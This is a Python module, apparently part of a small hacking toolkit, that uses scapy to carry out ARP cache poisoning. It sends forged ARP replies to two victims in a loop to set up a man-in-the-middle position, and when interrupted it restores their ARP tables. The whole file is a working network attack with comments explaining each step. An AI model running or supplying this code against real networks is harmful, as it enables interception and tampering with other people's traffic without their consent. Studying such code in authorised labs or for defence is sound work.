'''This package contains everything related to ARP poisoning'''
from scapy.all import ARP, send
from .general import get_target_mac
from time import sleep

def poison(victim_ip, spoof_ip):
    '''Change mac address in arp table'''

    # Get victim host ip address using previously created function
    victim_mac = get_target_mac(victim_ip)

    # Create the ARP packet, scapy will add your MAC address for hwsrc
    # op=2 means that ARP is going to send answer 
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    
    # print(packet) #debugging

    # Send the ARP packet without output
    send(packet, verbose=False)


def restore_arp(victim_ip, spoof_ip):
    '''Restore mac address in arp table'''

    # Find the MAC adresses of the victim and the IP you spoofed
    victim_mac = get_target_mac(victim_ip)
    spoof_real_mac = get_target_mac(spoof_ip)
    
    # Create the ARP packet, Now we want to add the actual MAC of the spoofed IP
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                       psrc=spoof_ip, hwsrc=spoof_real_mac)
    
    # Send the ARP packet without output
    send(packet, count=4, verbose=False)

def mitm_arp(victim_1_ip, victim_2_ip):
    '''This sets up a man in the middle between the two provided victim IPs'''
    poison_rounds = 0
    try:
        while True:
            poison(victim_1_ip, victim_2_ip)
            poison(victim_2_ip, victim_1_ip)
            sleep(2)
    except KeyboardInterrupt:
        print('\nInterupted, Reseting ARP tables. Please wait')
        restore_arp(victim_1_ip, victim_2_ip)
        restore_arp(victim_2_ip, victim_1_ip)
        print('\nARP table restored.')
